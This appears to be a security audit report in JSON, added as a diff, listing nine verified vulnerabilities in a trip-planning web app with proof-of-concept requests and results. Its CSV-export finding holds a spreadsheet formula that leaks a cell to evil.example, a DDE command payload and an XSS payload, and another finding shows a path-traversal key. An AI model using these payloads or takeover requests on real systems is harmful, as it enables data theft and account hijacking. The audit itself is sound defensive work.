@@ -1,0 +1,319 @@
+{
+  "generatedAt": "2026-11-28T04:26:00.353Z",
+  "runtime": {
+    "node": "v26.13.0",
+    "sqlite": "node:sqlite DatabaseSync (in-memory, migrations 0001..0003)"
+  },
+  "findings": [
+    {
+      "id": "VULN-01",
+      "title": "POST /api/collab/trips Missing Ownership Check Enables Full Trip Takeover & Data Exfiltration",
+      "severity": "Critical",
+      "verified": true,
+      "citations": [
+        "worker/collab.js:38-63",
+        "worker/collab.js:12-25",
+        "worker/collab.js:261-274"
+      ],
+      "poc": {
+        "request": {
+          "method": "POST",
+          "path": "/api/collab/trips",
+          "actor": "bob@example.com",
+          "body": {
+            "accessMode": "public",
+            "trip": {
+              "id": "trip_alice_secret",
+              "name": "Hijacked by Bob"
+            }
+          }
+        },
+        "response": {
+          "hijackStatus": 201,
+          "hijackJson": {
+            "ok": true,
+            "tripId": "trip_alice_secret",
+            "role": "owner",
+            "version": 1
+          },
+          "bobRoleInTripMembers": "owner",
+          "bobReadComments": [
+            "Alice private secret note: PIN 9988"
+          ],
+          "bobReadExpenses": [
+            {
+              "amount": 5000,
+              "note": "Private flight booking"
+            }
+          ],
+          "bobRestoredAliceOriginalTripName": "Alice Private Honeymoon",
+          "bobRemovedAliceStatus": 200,
+          "aliceRemainingInTripMembers": null,
+          "dbTripRow": {
+            "owner_id": "usr_7597393455d0d788ea0785c3",
+            "access_mode": "public",
+            "title": "Hijacked by Bob"
+          }
+        }
+      },
+      "details": "ON CONFLICT(id) DO UPDATE overwrites title, access_mode, and data_json without checking owner_id; then INSERT OR IGNORE INTO trip_members inserts attacker as owner. Attacker can read existing comments/expenses, restore version 1 to read original private itinerary, and remove original owner from trip_members."
+    },
+    {
+      "id": "VULN-02",
+      "title": "Public Trip GET Leaks Member Emails & Private Expenses/Comments/Votes; Non-Members Can Comment/Vote Across Trips",
+      "severity": "High",
+      "verified": true,
+      "citations": [
+        "worker/collab.js:23",
+        "worker/collab.js:94-121",
+        "worker/collab.js:192-230"
+      ],
+      "poc": {
+        "request": {
+          "method": "GET",
+          "path": "/api/collab/trips/trip_pub_1",
+          "unauthenticated": true
+        },
+        "response": {
+          "anonGetStatus": 200,
+          "leakedEmails": [
+            "alice.pii@example.com"
+          ],
+          "leakedExpensesCount": 1,
+          "leakedCommentsCount": 1,
+          "leakedVotesCount": 1,
+          "strangerPublicCommentStatus": 201,
+          "strangerPublicVoteStatus": 200,
+          "crossTripPrivatePollVoteStatus": 200
+        }
+      },
+      "details": "Unauthenticated GET on public trips returns users.email, expenses, comments, polls, and poll_votes. Additionally, any signed-in non-member gets role=viewer on public trips and can POST comments/votes (comments/vote only check `if (!user)`), and poll_votes does not verify poll_id belongs to tripId."
+    },
+    {
+      "id": "VULN-03",
+      "title": "PUT /api/collab/trips/:id Missing Optimistic Concurrency Check Causes Lost Updates",
+      "severity": "Medium",
+      "verified": true,
+      "citations": [
+        "worker/collab.js:124-140"
+      ],
+      "poc": {
+        "request": {
+          "method": "PUT",
+          "path": "/api/collab/trips/trip_race",
+          "body": {
+            "version": 1,
+            "trip": {
+              "name": "Bob Stale Edit (clobbers Alice)"
+            }
+          }
+        },
+        "response": {
+          "alicePutVersion": 2,
+          "bobStalePutStatus": 200,
+          "bobStalePutVersion": 3,
+          "finalTripName": "Bob Stale Edit (clobbers Alice)"
+        }
+      },
+      "details": "PUT /api/collab/trips/:id ignores client version and runs UPDATE trips SET ... WHERE id = ? without AND version = ?, allowing stale concurrent writes to silently overwrite newer edits."
+    },
+    {
+      "id": "VULN-04",
+      "title": "POST /api/collab/join/:token Overwrites Existing Owner Role via ON CONFLICT DO UPDATE",
+      "severity": "High",
+      "verified": true,
+      "citations": [
+        "worker/collab.js:66-83",
+        "worker/collab.js:12-25"
+      ],
+      "poc": {
+        "request": {
+          "method": "POST",
+          "path": "/api/collab/join/9481cda8cf1b18d1abf911b7c8ba1985",
+          "actor": "owner (alice.own@example.com)"
+        },
+        "response": {
+          "roleBefore": "owner",
+          "joinResponse": {
+            "ok": true,
+            "tripId": "trip_demote",
+            "role": "viewer"
+          },
+          "roleAfter": "viewer",
+          "ownerCreateInviteAfterStatus": 403,
+          "ownerEditTripAfterStatus": 403
+        }
+      },
+      "details": "ON CONFLICT(trip_id, user_id) DO UPDATE SET role=excluded.role overwrites owner to viewer/editor. Because getMemberRole() checks trip_members before trips.owner_id, the owner loses owner and editor permissions on their own trip."
+    },
+    {
+      "id": "VULN-05",
+      "title": "worker/collab.js Missing verifyCsrf(request) Check & Permissive Wildcard CORS on /api/profile & OPTIONS",
+      "severity": "Medium",
+      "verified": true,
+      "citations": [
+        "worker/collab.js:27-36",
+        "worker/auth.js:94-117",
+        "worker/index.js:9-18",
+        "worker/index.js:67-68"
+      ],
+      "poc": {
+        "request": {
+          "method": "POST",
+          "path": "/api/collab/trips",
+          "headers": {
+            "Origin": "https://evil.attacker"
+          }
+        },
+        "response": {
+          "authCrossOriginStatus": 403,
+          "collabCrossOriginStatus": 201,
+          "optionsCollabAcao": "*",
+          "optionsProfileAcao": "*",
+          "optionsProfileAllowHeaders": "Content-Type, Authorization, X-Sync-Key, X-Base-Updated-At"
+        }
+      },
+      "details": "handleCollabRequest never calls verifyCsrf(request), accepting state-changing requests with cross-origin Origin headers (relying solely on SameSite=Lax, which fails on same-site subdomains). Meanwhile /api/profile returns Access-Control-Allow-Origin: * and permits X-Sync-Key cross-origin."
+    },
+    {
+      "id": "VULN-06",
+      "title": "Auth Flaws: Password Reset Retains Sessions, OAuth Pre-Takeover & Unverified Email, Rate-Limit Bypass, Incomplete Account Deletion, SVG Avatar",
+      "severity": "High",
+      "verified": true,
+      "citations": [
+        "worker/auth.js:119-133",
+        "worker/auth.js:345",
+        "worker/auth.js:394-447",
+        "worker/auth.js:466-523",
+        "worker/auth.js:567",
+        "worker/auth.js:658-664"
+      ],
+      "poc": {
+        "request": {
+          "flows": [
+            "reset-password",
+            "request-reset",
+            "google-oauth-callback",
+            "login-rate-limit",
+            "delete-account",
+            "profile-avatar"
+          ]
+        },
+        "response": {
+          "resetPasswordStatus": 200,
+          "oldSessionAuthenticatedAfterReset": true,
+          "requestReset15CallsRateLimited": false,
+          "oauthStateCookieMissingSecure": true,
+          "oauthCallbackAcceptedUnverifiedEmail": true,
+          "attackerPasswordStillWorksAfterOAuth": true,
+          "bruteForceBypassedAttemptsWithout429": 27,
+          "deleteAccountStatus": 200,
+          "orphanedRowsWithoutPerConnectionFK": {
+            "trips": 1,
+            "comments": 1,
+            "expenses": 1,
+            "tripVersions": 1
+          },
+          "svgDataUrlAvatarAcceptedStatus": 200,
+          "noResendTokenLeakedInResponse": false
+        }
+      },
+      "details": "Verified: (1) reset-password does not delete existing rows in sessions; (2) request-reset never calls checkAuthRateLimit(ip, true); (3) Google OAuth ignores verified_email=false, sets kairos_oauth_state without Secure, and silently merges into an unverified password account without clearing password_hash/sessions; (4) logging into attacker own account calls clearAuthFailures(ip), resetting brute-force counter for all emails on that IP; (5) DELETE /api/account only deletes sessions and users, leaving trips/comments/expenses orphaned if PRAGMA foreign_keys is off (and trip_versions.author_id / expenses.payer_id lack FKs even when ON); (6) avatarUrl accepts data:image/svg+xml."
+    },
+    {
+      "id": "VULN-07",
+      "title": "Logout Leaves Local IndexedDB & Settings Intact, Causing Cross-User Data Leakage & Migration Into Next Logged-In Account",
+      "severity": "High",
+      "verified": true,
+      "citations": [
+        "js/lazy/account-center.js:245-249",
+        "js/services/auth-service.js:63-73",
+        "js/services/storage-db.js:522-539",
+        "worker/auth.js:598-634"
+      ],
+      "poc": {
+        "request": {
+          "flow": "Alice saves local data -> logout({ wipeAccountLocal: false }) -> Bob logs in -> Bob runs migrateLocalArchive()"
+        },
+        "response": {
+          "bobMigratedCount": 2,
+          "bobExportedAliceWishlistNote": "Alice secret diary note",
+          "bobExportedAliceTripTitle": "Alice Secret Trip",
+          "aliceCloudSyncPassphraseStillReadableLocally": "alice-secret-passphrase",
+          "bobClonedCollidingTripIds": [
+            "trip_shared_id_collision_9d63ab",
+            "trip_alice_local_1"
+          ]
+        }
+      },
+      "details": "account-center.js calls AuthService.logout({ wipeAccountLocal: false }). IndexedDB stores (trips, travelStatus, expenses, userPhotos) and localStorage/settings (cloudSyncPassphrase, mapillaryToken, wtg_collab_spaces_v1) remain readable to the next user on the same browser and get imported into User B cloud account."
+    },
+    {
+      "id": "VULN-08",
+      "title": "CSV Formula Injection Across All 3 CSV Exporters & Unescaped startTime XSS in Printable HTML Export",
+      "severity": "High",
+      "verified": true,
+      "citations": [
+        "js/lazy/export-service.js:19-23",
+        "js/lazy/export-service.js:199-208",
+        "js/lazy/export-service.js:233-245",
+        "js/modules/trip-planner.js:532-545",
+        "js/lazy/expense-splitter.js:84-89"
+      ],
+      "poc": {
+        "request": {
+          "function": "ExportService.toCSV / toPrintableHtml, TripPlanner.tripToCsv, ExpenseSplitter.settlementsToCsv"
+        },
+        "response": {
+          "exportServiceCsvSample": "1,2026-04-01,1,\"=HYPERLINK(\"\"https://evil.example?leak=\"\"&A1,\"\"Click\"\")\",scenic,\"09:00<img src=x onerror=alert(\"\"XSS_startTime\"\")>\",90,139.7,35.6,NO,+cmd|' /C calc'!A0",
+          "tripPlannerCsvHasUnescapedFormula": true,
+          "expenseSplitterCsvHasUnescapedFormula": true,
+          "printableHtmlRawInjection": "<td>09:00<img src=x onerror=alert(\"XSS_startTime\")></td>"
+        }
+      },
+      "details": "csvCell(), tripToCsv(), and settlementsToCsv() do not neutralize leading =, +, -, @, tab, or CR characters, enabling spreadsheet formula injection. Additionally, toPrintableHtml() interpolates s.startTime without escXml(), and exportTrip(\"pdf\") passes the result to window.open().document.write(html) (same-origin DOM XSS) or downloads an HTML file."
+    },
+    {
+      "id": "VULN-09",
+      "title": "Worker Proxy, R2 Upload, Sync Key & CSP Weaknesses (/api/img SVG, /api/photos Unauth+Traversal, /api/profile Conflict Bypass, Weak CSP)",
+      "severity": "High",
+      "verified": true,
+      "citations": [
+        "worker/index.js:20-28",
+        "worker/index.js:52-58",
+        "worker/index.js:158-198",
+        "worker/index.js:236-243",
+        "worker/index.js:346-418",
+        "worker/index.js:585-604"
+      ],
+      "poc": {
+        "request": {
+          "endpoints": [
+            "/api/img",
+            "/api/commons",
+            "/api/tile/*",
+            "/api/photos",
+            "/api/profile",
+            "/"
+          ]
+        },
+        "response": {
+          "apiImgSvgContentType": "image/svg+xml",
+          "apiImgHasCspOrNosniff": false,
+          "apiCommonsJsonfmContentType": "text/html; charset=utf-8",
+          "apiTileErrorContentType": "text/html; charset=utf-8",
+          "apiPhotosUnauthStatus": 201,
+          "apiPhotosUnauthKey": "anon/mwzwqu7i.jpg",
+          "apiPhotosTraversalKey": "../../etc/passwd/mwzwqu7i.jpg",
+          "apiProfileWeakKeyStatus": 200,
+          "apiProfileOmittedBaseOverwriteStatus": 200,
+          "apiProfileBackupStillExistsAfterDelete": true,
+          "rootCsp": "frame-ancestors *",
+          "accountModeCsp": "frame-ancestors 'none'",
+          "apiHealthHasNosniff": false
+        }
+      },
+      "details": "Verified: (1) /api/img serves image/svg+xml on worker origin without CSP sandbox or nosniff; (2) /api/commons,/api/wikidata,/api/wikipedia proxy upstream Content-Type verbatim (e.g., text/html for format=jsonfm); (3) /api/photos allows unauthenticated uploads to R2 with no size/magic-byte validation and path traversal in X-Sync-Key; (4) /api/profile accepts low-entropy 16-char X-Sync-Key, bypasses optimistic lock when X-Base-Updated-At is omitted, and leaves profile_backups intact after DELETE; (5) HTML CSP is only `frame-ancestors *` on / (no script-src/object-src/base-uri; account modal can be opened inside an iframe on /)."
+    }
+  ]
+}
